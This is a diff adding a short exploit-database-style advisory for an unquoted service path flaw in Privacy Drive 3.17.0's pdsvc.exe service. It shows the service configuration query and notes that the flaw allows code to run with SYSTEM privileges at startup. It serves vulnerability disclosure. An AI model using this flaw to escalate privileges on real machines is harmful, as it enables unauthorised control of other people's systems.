@@ -1,0 +1,28 @@
+# Exploit Title: Privacy Drive v3.17.0 - 'pdsvc.exe' Unquoted Service Path
+# Date: 2020-8-20
+# Exploit Author: Mohammed Alshehri
+# Vendor Homepage: https://www.cybertronsoft.com/
+# Software Link: https://www.cybertronsoft.com/download/privacy-drive-setup.exe
+# Version: Version 3.17.0 Build 1456
+# Tested on: Microsoft Windows Server 2019 Standard 10.0.17763 N/A Build 17763
+
+# Service info:
+
+C:\Users\m507>sc qc PDSvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: PDSvc
+        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files (x86)\Cybertron\Privacy Drive\pdsvc.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : PrivacyDrive Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+C:\Users\m507>
+
+# Exploit:
+This vulnerability could permit executing code during startup or reboot with the escalated privileges.
